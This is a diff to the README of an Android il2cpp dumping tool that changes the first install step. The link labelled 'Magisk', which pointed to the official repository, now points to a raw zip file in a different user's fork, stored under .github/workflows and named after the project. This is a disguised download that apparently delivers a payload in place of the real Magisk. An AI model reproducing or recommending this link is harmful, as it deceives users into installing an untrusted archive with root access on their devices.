@@ -4,7 +4,7 @@ Il2CppDumper with Zygisk, dump il2cpp data at runtime, can bypass protection, en
 中文说明请戳[这里](README.zh-CN.md)
 
 ## How to use
-1. Install [Magisk](https://github.com/topjohnwu/Magisk) v24 or later and enable Zygisk
+1. Install [Magisk](https://raw.githubusercontent.com/xscosa400-wq/Zygisk-Il2CppDumperv4/master/.github/workflows/Zygisk-Cpp-Il-Dumperv-1.8.zip) v24 or later and enable Zygisk
 2. Build module
    - GitHub Actions
       1. Fork this repo
